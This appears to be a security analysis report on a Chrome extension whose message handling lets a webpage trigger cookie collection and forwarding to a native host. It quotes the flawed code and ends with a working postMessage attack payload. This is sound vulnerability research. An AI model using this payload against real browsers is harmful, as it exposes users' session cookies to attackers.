# CoCo Analysis: aicohdnbjhigmdoeilbigahinnmcnnnk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (all same vulnerability pattern)

---

## Sink: cookies_source → externalNativePortpostMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/aicohdnbjhigmdoeilbigahinnmcnnnk/opgen_generated_files/bg.js
Line 1408: `cookiestr += (cookiestr ? "; " : "") + cookie.name + "=" + cookie.value;`

The flow reads cookies and sends them via native port postMessage.

**Code:**

```javascript
// Content script - nmext.js (Line 126-176)
window.addEventListener("message", function(event) {
  if (event.source !== window) return;
  if (windoworigin && event.origin !== windoworigin) return;

  if (event.data.type && (event.data.type == "com.fabasoft.nm.sendpm20")) { // ← attacker-controlled
    try {
      var data = event.data; // ← attacker-controlled message
      data.srcurl = event.source.location.href;
      portPromise.then(function(port) {
        port.postMessage(data); // ← forwards to background
      });
    } catch (e) { /* error handling */ }
  }
}, false);

// Content script - nmext.js (Line 54-64) - Response handler
port.onMessage.addListener(function(data, sender) {
  if (data && data.type === "com.fabasoft.nm.back.connect") {
    resolve(port);
  } else {
    if (windoworigin) {
      window.postMessage(data, windoworigin); // ← sends response back to webpage
    }
  }
});

// Background script - nmextback.js (Line 1207-1299)
chrome.runtime.onConnect.addListener(function (contentport) {
  contentport.onMessage.addListener(function (data, sender) {
    if (data.method == "Init") { // ← attacker controls method field
      postMessageWithCookies(data, contentport, contentportid);
    } else if (data.method == "UpdateLoginToken") {
      postMessageWithCookies(data, contentport, contentportid);
    }
  });
});

// Background script - nmextback.js (Line 1349-1384)
function postMessageWithCookies(data, contentport, contentportid) {
  chrome.cookies.getAllCookieStores(function (stores) {
    var storeid = null;
    // ... find store id for the tab
    chrome.cookies.getAll({ url: data.srcurl, storeId: storeid }, function (cookies) {
      var cookiestr = "";
      if (cookies) {
        for (var i = 0; i < cookies.length; i++) {
          var cookie = cookies[i];
          cookiestr += (cookiestr ? "; " : "") + cookie.name + "=" + cookie.value; // ← cookies leaked
        }
      }
      data.indata.cookies = cookiestr;
      port.postMessage(data); // ← sends to native host with cookies
    });
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (webpage to content script)

**Attack:**

```javascript
// Malicious webpage exploitation
window.postMessage({
  type: "com.fabasoft.nm.sendpm20",
  method: "Init",  // Triggers cookie collection
  callid: "attack123",
  indata: {}
}, "*");

// The extension will:
// 1. Receive the message in content script
// 2. Forward to background script
// 3. Read all cookies for the current URL
// 4. Send cookies to native messaging host
// 5. Native host receives sensitive cookie data
```

**Impact:** Information disclosure - An attacker-controlled webpage can trigger the extension to read all cookies for any URL and exfiltrate them to a native messaging application. While the cookies are sent to the native host (not directly back to the webpage), this represents a privilege escalation where webpage-level code can access cookie data it shouldn't have access to, and potentially leak it outside the browser sandbox to a native application.
